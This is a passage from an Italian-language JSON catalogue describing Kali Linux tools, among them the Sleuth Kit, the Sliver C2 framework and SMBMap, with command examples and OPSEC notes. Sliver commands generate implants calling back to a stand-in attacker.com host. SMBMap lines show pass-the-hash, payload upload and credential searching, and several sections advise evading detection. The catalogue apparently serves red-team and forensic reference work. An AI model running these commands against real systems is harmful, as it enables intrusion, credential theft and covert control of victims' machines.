di inode\nicat -o 2048 disk_image.dd 12345 > recovered_file.doc\n\n# Genera body file per timeline analysis\nfls -m '/' -r -o 2048 disk_image.dd > bodyfile.txt\n\n# Crea timeline ordinata dal body file\nmactime -b bodyfile.txt -d > timeline.csv\n\n# Analizza statistiche del filesystem\nfsstat -o 2048 disk_image.dd\n\n# Cerca stringhe nello spazio non allocato\nblkls -o 2048 disk_image.dd | strings > unallocated_strings.txt</code></pre><p>Il parametro -o specifica l'offset della partizione in settori, ottenuto dall'output di mmls. Per analisi NTFS approfondite, considerare l'integrazione con strumenti come analyzeMFT per l'elaborazione completa della Master File Table.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle <strong>indagini forensi digitali</strong>, TSK e lo strumento fondamentale per l'analisi di dischi sequestrati. Permette di recuperare file cancellati dall'indagato, ricostruire la timeline delle attivita sul computer, identificare file nascosti in Alternate Data Streams NTFS e verificare se i timestamp sono stati manipolati. L'output di TSK e accettato come evidenza in procedimenti legali quando l'analisi segue protocolli forensi standard.</p><p>Durante <strong>incident response</strong>, la suite viene utilizzata per analizzare immagini disco di sistemi compromessi. La timeline analysis aiuta a determinare il punto di compromissione iniziale, le azioni dell'attaccante sul filesystem, i file creati o modificati dal malware e i meccanismi di persistence installati. Il recupero di file cancellati puo rivelare strumenti dell'attaccante che sono stati rimossi durante le fasi di cleanup.</p><p>Per <strong>analisi malware e threat intelligence</strong>, TSK permette di estrarre artefatti dal filesystem di sistemi infetti senza eseguire il sistema operativo compromesso. Questo approccio offline e sicuro garantisce che il malware non possa attivarsi o modificare le evidenze durante l'analisi, fornendo una vista completa e inalterata del filesystem al momento dell'acquisizione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> TSK opera offline su immagini disco e non interagisce con sistemi live, quindi non genera traffico di rete ne lascia tracce sul sistema analizzato. Tuttavia, il processo di acquisizione dell'immagine disco (che precede l'analisi con TSK) puo essere rilevato se eseguito su un sistema live. L'analisi stessa non presenta rischi di rilevamento poiche opera sulla copia forense.</p><p><strong>Impatto operativo:</strong> L'integrita delle evidenze dipende interamente dalla correttezza della catena di custodia e del processo di acquisizione. Errori nella specifica dell'offset di partizione possono portare a risultati errati o alla mancata identificazione di evidenze. L'analisi di immagini molto grandi richiede spazio disco significativo e tempi di elaborazione considerevoli, specialmente per la generazione di timeline complete.</p><p><strong>Mitigazioni:</strong> Verificare sempre gli hash dell'immagine disco prima e dopo l'analisi per garantire che non sia stata modificata. Utilizzare sempre write blocker hardware durante l'acquisizione dell'evidenza originale. Documentare ogni comando eseguito e il suo output per mantenere la riproducibilita dell'analisi. Lavorare esclusivamente su copie forensi verificate e conservare l'evidenza originale in ambiente protetto con accesso controllato e documentato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "sliver",
    "name": "sliver",
    "version": "1.5.42",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sliver/",
    "desc": "Framework C2 moderno con implant Go cross-platform, mTLS, WireGuard e pivoting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sliver</strong> e un framework Command and Control (C2) open source sviluppato da BishopFox, progettato per operazioni red team e adversary simulation. Si distingue nel panorama dei framework C2 per i suoi implant compilati in Go che offrono compatibilita cross-platform nativa per Windows, Linux e macOS senza dipendenze runtime. Sliver implementa comunicazioni cifrate attraverso multipli protocolli tra cui mTLS (mutual TLS), WireGuard, HTTP(S) e DNS, fornendo flessibilita nella selezione del canale C2 piu appropriato per l'ambiente target. L'architettura multi-operatore permette a interi team di gestire simultaneamente operazioni complesse con condivisione delle sessioni e coordinamento centralizzato. Il framework include capacita avanzate di pivoting attraverso reti segmentate, port forwarding, SOCKS5 proxy e tunneling, rendendolo adatto a scenari enterprise con architetture di rete complesse. Sliver e considerato una delle alternative open source piu mature a Cobalt Strike.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Implant Go cross-platform con evasion integrata:</strong> Gli implant di Sliver sono compilati in Go e producono binari standalone senza dipendenze esterne per Windows, Linux e macOS. Il framework supporta sia sessioni interattive (real-time) sia beacon mode (callback periodici) per adattarsi a diversi scenari operativi. Gli implant includono tecniche di evasion come obfuscation del codice, randomizzazione delle stringhe e traffic encryption, con la possibilita di generare varianti uniche per ogni operazione modificando il codice sorgente dell'implant.</p><p><strong>Comunicazioni multi-protocollo cifrate:</strong> Sliver supporta quattro protocolli di comunicazione C2 configurabili in base all'ambiente target. mTLS fornisce autenticazione bidirezionale e crittografia robusta per ambienti dove il traffico TLS e consentito. WireGuard offre un tunnel VPN leggero e performante. HTTP(S) permette di mimetizzare il traffico C2 come navigazione web normale, configurabile con profili di malleable traffic. DNS tunneling consente comunicazioni anche in ambienti con restrizioni di rete estreme dove solo il traffico DNS e consentito.</p><p><strong>Pivoting avanzato e operazioni multi-operatore:</strong> Il framework eccelle nelle capacita di pivoting attraverso reti segmentate, supportando TCP e UDP pivot, port forwarding bidirezionale e proxy SOCKS5 attraverso gli implant compromessi. Multipli operatori possono connettersi al server Sliver simultaneamente, visualizzare le sessioni attive, assegnare task e coordinare le attivita attraverso un'interfaccia condivisa. Il sistema include anche armory, un package manager per estensioni e BOF (Beacon Object Files) che amplia le capacita post-exploitation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sliver utilizza un'architettura server-client dove il server gestisce listener, sessioni e la generazione di implant. Il client fornisce un'interfaccia interattiva con completamento automatico dei comandi e help integrato.</p><pre><code># Avvia il server Sliver\nsliver-server\n\n# Genera un implant con comunicazione mTLS\ngenerate --mtls attacker.com:443 --os windows --arch amd64 --save /tmp/implant.exe\n\n# Genera implant in beacon mode con intervallo di 60 secondi\ngenerate beacon --mtls attacker.com:443 --os windows --seconds 60 --jitter 30\n\n# Avvia listener mTLS\nmtls --lhost 0.0.0.0 --lport 443\n\n# Avvia listener HTTPS con domain fronting\nhttps --lhost 0.0.0.0 --lport 443 --domain front.cdn.com\n\n# Interagisci con una sessione attiva\nuse [session-id]\ninfo\nps\ngetprivs\n\n# Esegui .NET assembly in memoria\nexecute-assembly /path/to/seatbelt.exe -group=all\n\n# Configura pivot SOCKS5\nsocks5 start --port 1080</code></pre><p>Il sistema di armory permette di installare estensioni aggiuntive come BOF per Kerberos attacks, credential dumping e Active Directory enumeration. Utilizzare il comando armory per browsare e installare le estensioni disponibili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>operazioni red team enterprise</strong>, Sliver fornisce un framework C2 completo per gestire l'intero ciclo di un engagement, dall'accesso iniziale alla post-exploitation avanzata. La capacita di generare implant cross-platform e comunicare attraverso protocolli multipli permette di adattarsi a qualsiasi ambiente target, mentre il supporto multi-operatore facilita il coordinamento di team distribuiti durante operazioni complesse e prolungate.</p><p>In scenari di <strong>adversary simulation e purple teaming</strong>, Sliver emula realisticamente le TTP (Tactics, Techniques and Procedures) di threat actor avanzati. Le capacita di pivoting, lateral movement e esecuzione in memoria replicano le tecniche utilizzate da APT reali, fornendo al blue team opportunita concrete di testare e migliorare le proprie capacita di detection e response in condizioni realistiche.</p><p>Per <strong>penetration testing in ambienti con reti segmentate</strong>, le capacita avanzate di pivoting di Sliver permettono di navigare attraverso multiple zone di rete, stabilire tunnel persistenti e raggiungere target in segmenti altrimenti inaccessibili direttamente, mappando l'effettiva segmentazione della rete e identificando punti deboli nell'architettura di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli implant Go hanno caratteristiche binarie riconoscibili come la dimensione elevata del file, la presenza di stringhe Go runtime e pattern di import specifici che le soluzioni EDR avanzate possono identificare. Il traffico mTLS e WireGuard, sebbene cifrato, genera pattern di connessione distinguibili dal traffico utente normale. Le signature degli implant Sliver sono presenti nei database di threat intelligence di molti vendor e regole YARA pubbliche sono disponibili per la detection statica.</p><p><strong>Impatto operativo:</strong> La generazione di implant con configurazioni default produce artefatti con caratteristiche note. L'esecuzione di assembly .NET in memoria tramite execute-assembly genera eventi ETW monitorabili dalle soluzioni EDR. I pivot attraverso la rete creano connessioni anomale tra sistemi che possono essere rilevate da soluzioni di network detection and response (NDR). Il beacon mode con intervalli regolari produce pattern statisticamente identificabili nel traffico.</p><p><strong>Mitigazioni:</strong> Compilare implant personalizzati modificando il codice sorgente per alterare signature note e ridurre la dimensione del binario. Configurare jitter elevato (30-50%) per randomizzare gli intervalli di beacon e rendere piu difficile la detection statistica. Utilizzare domain fronting o redirector intermedi per mascherare l'indirizzo del teamserver. Selezionare il protocollo C2 in base al traffico normale dell'ambiente target. Considerare l'uso di BOF invece di execute-assembly per ridurre gli eventi ETW generati durante la post-exploitation.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "smbmap",
    "name": "smbmap",
    "version": "1.10.7",
    "icon": "../app/icons/smbmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/smbmap/",
    "desc": "Enumera share SMB, permessi, file e consente upload/download/execution remota.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMBMap</strong> e uno strumento specializzato nell'enumerazione e nell'interazione con share di rete SMB (Server Message Block), il protocollo fondamentale per la condivisione di file e risorse in ambienti Windows e Active Directory. Lo strumento va oltre la semplice enumerazione degli share disponibili, fornendo informazioni dettagliate sui permessi di accesso (lettura, scrittura, esecuzione), la possibilita di navigare ricorsivamente il contenuto degli share, e capacita operative come download, upload e esecuzione remota di comandi. SMBMap e particolarmente efficace durante penetration test in ambienti enterprise dove gli share di rete rappresentano una superficie di attacco significativa, spesso contenendo file sensibili come configurazioni, backup di database, credenziali e documenti riservati. Lo strumento supporta autenticazione con credenziali in chiaro, hash NTLM per pass-the-hash e null session per enumerazione anonima, adattandosi a diversi livelli di accesso ottenuti durante l'engagement.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione share e permessi:</strong> SMBMap elenca tutti gli share disponibili su un target SMB mostrando per ciascuno il livello di accesso effettivo dell'utente autenticato: READ (lettura), WRITE (scrittura), READ/WRITE o NO ACCESS. Questa mappatura dei permessi e fondamentale per identificare rapidamente share con accesso in scrittura (potenziali vettori per lateral movement) e share leggibili (potenziali fonti di informazioni sensibili). Lo strumento testa automaticamente sia null session sia credenziali fornite.</p><p><strong>Navigazione ricorsiva e operazioni su file:</strong> La modalita ricorsiva permette di esplorare l'intera struttura di directory di uno share, visualizzando file e sottocartelle con dimensioni e timestamp. Le operazioni di file includono download di file specifici per l'analisi locale, upload di file (payload, strumenti) su share con permessi di scrittura, e cancellazione di file. Il supporto per pattern matching consente di cercare file specifici per nome o estensione attraverso l'intero share.</p><p><strong>Esecuzione remota e pass-the-hash:</strong> SMBMap include la capacita di eseguire comandi sul sistema target attraverso il protocollo SMB, sfruttando servizi come SVCCTL per la creazione di servizi temporanei. Lo strumento supporta nativamente l'autenticazione tramite hash NTLM, permettendo attacchi pass-the-hash senza necessita di conoscere la password in chiaro. Questa combinazione di enumerazione e execution rende SMBMap uno strumento versatile per l'intera fase di lateral movement.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SMBMap supporta diversi metodi di autenticazione e puo operare sia su singoli target sia su range di indirizzi. La combinazione con strumenti come CrackMapExec e Impacket amplia significativamente le capacita operative.</p><pre><code># Enumerazione share con null session (accesso anonimo)\nsmbmap -H 192.168.1.100\n\n# Enumerazione con credenziali di dominio\nsmbmap -H 192.168.1.100 -u administrator -p 'Password123' -d DOMAIN\n\n# Pass-the-hash con NTLM hash\nsmbmap -H 192.168.1.100 -u admin -p 'aad3b435b51404eeaad3b435b51404ee:hash' -d DOMAIN\n\n# Lista ricorsiva del contenuto di uno share\nsmbmap -H 192.168.1.100 -u user -p pass -r 'C$\\Users'\n\n# Download di un file specifico dallo share\nsmbmap -H 192.168.1.100 -u user -p pass --download 'share$\\path\\to\\file.txt'\n\n# Upload di un file su share con permesso di scrittura\nsmbmap -H 192.168.1.100 -u user -p pass --upload payload.exe 'share$\\temp\\payload.exe'\n\n# Esecuzione remota di comandi\nsmbmap -H 192.168.1.100 -u admin -p pass -x 'ipconfig /all'\n\n# Cerca file per pattern in tutti gli share accessibili\nsmbmap -H 192.168.1.100 -u user -p pass -R -A '(password|credential|config)' --depth 5</code></pre><p>Per operazioni su larga scala in ambienti Active Directory, considerare l'integrazione con script che iterano sui Domain Controller e file server identificati durante la fase di enumeration. I risultati di SMBMap possono essere correlati con le informazioni di BloodHound per identificare path di attacco attraverso share mal configurati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>penetration test in ambienti Active Directory</strong>, SMBMap e essenziale per mappare tutti gli share accessibili con le credenziali ottenute e identificare file sensibili esposti. Share con permessi di lettura possono contenere script con credenziali hardcoded, backup di database, file di configurazione con password o documenti riservati. Share con permessi di scrittura rappresentano vettori per il deployment di payload e strumenti per il lateral movement.</p><p>Per <strong>lateral movement e privilege escalation</strong>, la combinazione di enumerazione share e esecuzione remota permette di muoversi attraverso la rete utilizzando credenziali o hash ottenuti. Gli operatori possono caricare strumenti su share scrivibili, eseguire comandi per stabilire persistence e raccogliere ulteriori credenziali dai sistemi compromessi in modo sistematico e controllato.</p><p>Nell'ambito di <strong>audit di sicurezza degli share di rete</strong>, SMBMap viene utilizzato per verificare la conformita delle configurazioni di accesso agli share. L'identificazione di share con permessi eccessivi (Everyone:Full Control, null session access) o contenenti dati sensibili senza adeguata protezione fornisce finding concreti per il report di audit e raccomandazioni di remediation specifiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Ogni accesso SMB viene registrato nei Security Event Log di Windows con eventi specifici: Event ID 4624 per logon riusciti, 4625 per falliti, 5140 per accesso a share e 5145 per accesso a file. Le soluzioni SIEM correlano questi eventi per identificare pattern di enumerazione anomali come accesso sequenziale a multipli share o tentativi con credenziali diverse. IDS di rete rilevano scanning SMB attraverso l'analisi del traffico sulla porta 445.</p><p><strong>Impatto operativo:</strong> L'enumerazione ricorsiva di share di grandi dimensioni genera un volume significativo di traffico di rete e eventi nei log di sicurezza. I tentativi di null session o con credenziali errate generano eventi di autenticazione fallita che possono attivare alert e policy di lockout. L'esecuzione remota di comandi tramite -x crea servizi temporanei visibili nel Service Control Manager e genera eventi di creazione processo (Sysmon Event ID 1).</p><p><strong>Mitigazioni:</strong> Limitare l'enumerazione ai target specifici piuttosto che scansionare interi range di rete. Utilizzare credenziali valide fin dall'inizio per evitare eventi di autenticazione fallita. Ridurre la profondita della ricorsione e focalizzarsi su share e directory di interesse. Per l'esecuzione remota, preferire tecniche meno rumorose come WMI o WinRM quando disponibili. Eseguire le operazioni durante l'orario lavorativo per mimetizzarsi con il traffico SMB legittimo degli utenti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "smtp-user-enum",
    "name": "smtp-user-enum",
    "version": "1.2",
    "icon": "../app/icons/smtp-user-enum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/smtp-user-enum/",
    "desc": "Enumera utenti validi su server SMTP via VRFY, EXPN e RCPT TO per harvesting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMTP-User-Enum</strong> e uno strumento specializzato nell'enumerazione di utenti validi su server di posta SMTP. Sfrutta tre comandi nativi del protocollo - VRFY, EXPN e RCPT TO - per determinare se un indirizzo email esiste realmente sul server analizzando le risposte (codice 250 per utente valido, 550 per inesistente). Lo strumento accetta wordlist di nomi utente e puo testare centinaia di account automaticamente. E particolarmente efficace contro server SMTP legacy o mal configurati che non hanno disabilitato i comandi di verifica.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione VRFY:</strong> Invia una richiesta diretta al server per verificare l'esistenza di un utente specifico. Il server risponde con codice 250 se l'utente esiste. Metodo diretto ma comunemente disabilitato sui server moderni.</p><p><strong>Enumerazione RCPT TO:</strong> Simula l'invio di una mail specificando il destinatario e analizza la risposta del server. E il metodo piu affidabile perche raramente viene disabilitato, essendo essenziale per il funzionamento del protocollo SMTP.</p><p><strong>Enumerazione EXPN:</strong> Espande mailing list e alias di posta, rivelando non solo l'esistenza di una lista ma anche tutti i membri. Fornisce piu informazioni degli altri metodi ma e spesso disabilitato per ragioni di sicurezza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Impiegato durante la fase di information gathering per costruire una lista di indirizzi email validi su un dominio target.</p><pre><code># Enumerazione con metodo VRFY e wordlist\nsmtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t mail.target.com\n\n# Enumerazione con RCPT TO specificando il dominio\nsmtp-user-enum -M RCPT -U users.txt -D target.com -t mail.target.com\n\n# Scansione multi-thread con porta custom\nsmtp-user-enum -M VRFY -U users.txt -t mail.target.com -p 587 -T 10\n\n# Verifica di un singolo utente\nsmtp-user-enum -M RCPT -u administrator -D target.com -t mail.target.com</code></pre><p>Il parametro -T controlla i thread concorrenti. Iniziare con RCPT TO per maggiore probabilita di successo sui server moderni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per campagne di <strong>phishing mirato</strong>, costruisce liste di indirizzi email verificati aumentando il tasso di successo. Per <strong>penetration testing di infrastrutture email</strong>, verifica la corretta configurazione dei server e se VRFY/EXPN sono disabilitati. Per la preparazione di <strong>password spraying</strong>, la lista di utenti validi elimina tentativi su account inesistenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi vengono registrati nei log del mail server e possono generare alert. Pattern di centinaia di comandi VRFY in rapida successione sono facilmente identificabili da IDS e soluzioni anti-spam.</p><p><strong>Impatto operativo:</strong> Un volume eccessivo di query puo degradare le prestazioni del server. Server moderni come Exchange ben configurati restituiscono risposte uniformi indipendentemente dall'esistenza dell'utente.</p><p><strong>Mitigazioni:</strong> Utilizzare delay tra le richieste e limitare i thread concorrenti. Preferire RCPT TO che genera traffico simile a operazioni legittime.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "sniffjoke",
    "name": "sniffjoke",
    "version": "0.4.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sniffjoke/",
    "desc": "Offusca traffico di rete per eludere IDS/IPS con tecniche di evasion TCP/IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SniffJoke</strong> e uno strumento avanzato di evasione di rete progettato per offuscare il traffico TCP/IP al fine di eludere IDS/IPS. Opera come proxy trasparente iniettando pacchetti appositamente costruiti nel flusso di comunicazione per confondere i motori di analisi. Sfrutta ambiguita nelle implementazioni dello stack TCP/IP dove pacchetti vengono processati diversamente dal sistema di monitoraggio e dal destinatario finale. Il suo approccio modulare tramite plugin consente di combinare diverse tecniche di evasione in base allo scenario.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Iniezione di pacchetti spuri:</strong> Inserisce pacchetti malformati accettati dall'IDS ma scartati dal destinatario reale, confondendo il reassembly del traffico. Le tecniche includono TTL manipulation, checksum invalidi e flag TCP inconsistenti.</p><p><strong>Frammentazione evasiva:</strong> Implementa tecniche di frammentazione IP con overlapping fragments e tiny fragments per mascherare il contenuto reale della comunicazione contro IDS senza reassembly completo.</p><p><strong>Sistema a plugin modulare:</strong> Architettura a plugin che permette di caricare e combinare tecniche di evasione in modo dinamico. Ogni plugin implementa una specifica strategia di offuscamento attivabile in base al sistema difensivo da eludere.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguito come proxy trasparente sulla macchina dell'attaccante. Richiede privilegi root per operare a livello di rete.</p><pre><code># Avvio con configurazione predefinita\nsudo sniffjoke start\n\n# Specifica interfaccia e livello aggressivita\nsudo sniffjoke -i eth0 --aggressive\n\n# Avvio con plugin specifici\nsudo sniffjoke -i eth0 --plugin fragmentation,ttl_manipulation\n\n# Modalita debug\nsudo sniffjoke -i eth0 -d --logfile /tmp/sj_debug.log\n\n# Arresto del servizio\nsudo sniffjoke stop</code></pre><p>Testare l'efficacia delle tecniche contro il tipo specifico di IDS/IPS presente nell'ambiente target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante operazioni di <strong>red team con IDS/IPS attivi</strong>, mantiene comunicazioni C2 attive senza essere rilevati. Per <strong>ricerca sulla sicurezza dei sistemi di detection</strong>, valuta l'efficacia di IDS nel rilevare traffico offuscato. In scenari di <strong>penetration testing stealth</strong>, riduce la probabilita di rilevamento durante scansioni e exploitation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> IDS/IPS moderni come Suricata e Zeek implementano normalizzazione del traffico che neutralizza le tecniche di offuscamento. L'utilizzo stesso genera pattern anomali identificabili tramite analisi statistica.</p><p><strong>Impatto operativo:</strong> L'iniezione di pacchetti aggiuntivi aumenta il volume di traffico e introduce latenza. Alcune tecniche causano problemi di connettivita con determinati sistemi operativi.</p><p><strong>Mitigazioni:</strong> Testare in ambiente controllato prima dell'impiego operativo. Selezionare solo i plugin necessari per ridurre il profilo di anomalia.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "snmpcheck",
    "name": "snmpcheck",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/snmpcheck/",
    "desc": "Enumera informazioni SNMP da dispositivi di rete: interfacce, routing, processi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SNMPCheck</strong> e uno strumento di enumerazione che sfrutta SNMP per estrarre informazioni dettagliate da dispositivi di rete. A differenza di tool generici come snmpwalk, organizza automaticamente i dati in categorie logiche: sistema, interfacce, routing, processi e software installato. Supporta SNMPv1, v2c e v3 con relativi meccanismi di autenticazione. E particolarmente efficace su reti enterprise dove dispositivi espongono SNMP con community string di default.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione di sistema completa:</strong> Raccoglie hostname, descrizione del dispositivo, contatti amministrativi, location e uptime. L'analisi dell'uptime rivela frequenza di patching e manutenzione del dispositivo.</p><p><strong>Analisi interfacce di rete:</strong> Enumera tutte le interfacce con IP, subnet mask, MAC e statistiche traffico. Permette di mappare la topologia e identificare segmenti non documentati.</p><p><strong>Inventario processi e software:</strong> Estrae la lista dei processi in esecuzione e del software installato, fondamentale per identificare versioni vulnerabili e strumenti di sicurezza presenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Utilizzato dopo aver identificato dispositivi con porta UDP 161 aperta. Richiede la community string per v1/v2c o credenziali per v3.</p><pre><code># Enumerazione base con community string public\nsnmpcheck -t 192.168.1.1\n\n# Community string personalizzata\nsnmpcheck -t 192.168.1.1 -c private\n\n# SNMPv3 con autenticazione e crittografia\nsnmpcheck -t 192.168.1.1 -v 3 -u admin -l authPriv -a SHA -A authpass -x AES -X privpass\n\n# Output dettagliato\nsnmpcheck -t 192.168.1.1 -c public -v 2c -d</code></pre><p>Iniziare con community string \"public\" e tentare varianti come \"private\" e stringhe specifiche del vendor.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>mappatura dell'infrastruttura</strong>, raccoglie informazioni su decine di dispositivi costruendo un inventario completo. Per la <strong>ricerca di vulnerabilita</strong>, le versioni firmware vengono incrociate con database di vulnerabilita note. Per <strong>audit SNMP</strong>, verifica se i dispositivi sono accessibili con community string di default.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query SNMP vengono registrate nei log dei dispositivi e possono generare trap verso sistemi NMS. Soluzioni di monitoraggio rilevano query da sorgenti non autorizzate.</p><p><strong>Impatto operativo:</strong> SNMPv1/v2c trasmettono la community string in chiaro. Query eccessive possono impattare dispositivi con risorse limitate.</p><p><strong>Mitigazioni:</strong> Utilizzare SNMPv3 quando possibile. Limitare la frequenza delle query ed eseguire l'enumerazione da segmenti di rete autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "snmpenum",
    "name": "snmpenum",
    "version": "0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/snmpenum/",
    "desc": "Script Perl per enumeration SNMP con query OID comuni per device discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SNMPEnum</strong> e uno script Perl per enumerazione SNMP che utilizza file di configurazione contenenti OID predefiniti per estrarre informazioni specifiche da diversi tipi di dispositivi. Viene distribuito con file OID ottimizzati per Windows, Linux e Cisco, eseguendo query mirate che restituiscono solo informazioni rilevanti per il tipo di dispositivo. La sua architettura basata su file di configurazione lo rende facilmente estensibile con OID personalizzati per dispositivi specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>File OID per piattaforma:</strong> Include configurazioni per Windows (utenti, share, servizi, processi), Linux (filesystem, interfacce, routing) e Cisco (configurazioni, VLAN, ACL). Ogni file contiene OID curati per la piattaforma target, riducendo il traffico generato.</p><p><strong>Query OID personalizzate:</strong> Supporta file OID definiti dall'utente per dispositivi non standard come stampanti, UPS, sistemi SCADA o dispositivi IoT industriali. Questa flessibilita permette di adattare l'enumerazione a qualsiasi ambiente.</p><p><strong>Estrazione dati strutturata:</strong> I risultati vengono organizzati e formattati per categoria, facilitando l'analisi rapida e l'identificazione di informazioni sensibili come credenziali e servizi esposti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Utilizzato dopo aver identificato dispositivi con SNMP attivo e la community string valida. La selezione del file OID dipende dal tipo di dispositivo target.</p><pre><code># Enumerazione sistema Windows\nsnmpenum -t 192.168.1.100 -c public -i windows.txt\n\n# Enumerazione dispositivo Linux\nsnmpenum -t 192.168.1.50 -c public -i linux.txt\n\n# Enumerazione router Cisco\nsnmpenum -t 192.168.1.1 -c private -i cisco.txt\n\n# File OID personalizzato\nsnmpenum -t 192.168.1.200 -c public -i custom_printer.txt</code></pre><p>Eseguire prima un'enumerazione generica per identificare il tipo di dispositivo (sysDescr OID 1.3.6.1.2.1.1.1), poi selezionare il file OID appropriato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>enumerazione Windows via SNMP</strong>, estrae utenti locali, share, servizi e programmi installati spesso non accessibili senza autenticazione. Per <strong>ricognizione di rete</strong>, raccoglie configurazioni da router e switch incluse VLAN e ACL. Per <strong>dispositivi non standard</strong>, file OID personalizzati permettono di enumerare IoT e sistemi industriali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query SNMP bulk generano traffico UDP significativo identificabile da sistemi di monitoraggio. I pattern di OID richiesti sono caratteristici di strumenti di enumerazione e identificabili da regole IDS.</p><p><strong>Impatto operativo:</strong> SNMP v1/v2c trasmette la community string in chiaro. Enumerazione aggressiva con molti OID puo sovraccaricare dispositivi con risorse limitate.</p><p><strong>Mitigazioni:</strong> Inserire pause tra le query per ridurre il traffico. Utilizzare file OID ridotti con solo gli OID necessari. Operare da segmenti di rete che normalmente generano traffico SNMP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "sparrow-wifi",
    "name": "sparrow-wifi",
    "version": "0.0~git20240725",
    "icon": "../app/icons/sparrow-wifi-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sparrow-wifi/",
    "desc": "Analizzatore WiFi con GUI per spectrum analysis, geolocalizzazione e drone hunting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sparrow-WiFi</strong> e un analizzatore wireless avanzato con interfaccia grafica PyQt5, progettato per spectrum analysis, geolocalizzazione di access point e rilevamento droni. Integra supporto nativo per GPS per associare coordinate geografiche ai punti di accesso e generare mappe di copertura. Supporta hardware SDR come HackRF per estendere l'analisi oltre le frequenze WiFi standard. La funzionalita di drone hunting sfrutta signature WiFi dei droni commerciali per identificarne la presenza.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Analisi WiFi in tempo reale:</strong> Visualizza access point con SSID, BSSID, canale, sicurezza e potenza del segnale. L'interfaccia aggiorna i dati in tempo reale con grafici della potenza, supportando bande 2.4 GHz e 5 GHz.</p><p><strong>Geolocalizzazione GPS integrata:</strong> Con ricevitore GPS collegato, associa automaticamente coordinate geografiche a ogni access point, consentendo mappe di copertura wireless per wardriving e documentazione della superficie di attacco.</p><p><strong>Rilevamento droni via WiFi:</strong> Modulo specializzato che mantiene un database di signature WiFi (OUI produttori, pattern SSID) per identificare droni DJI, Parrot e altri, con alert in tempo reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede interfaccia wireless in modalita monitor e opzionalmente ricevitore GPS USB.</p><pre><code># Avvio interfaccia grafica\nsudo sparrow-wifi\n\n# Con interfaccia wireless specifica\nsudo sparrow-wifi -i wlan0mon\n\n# Con supporto GPS\nsudo sparrow-wifi -i 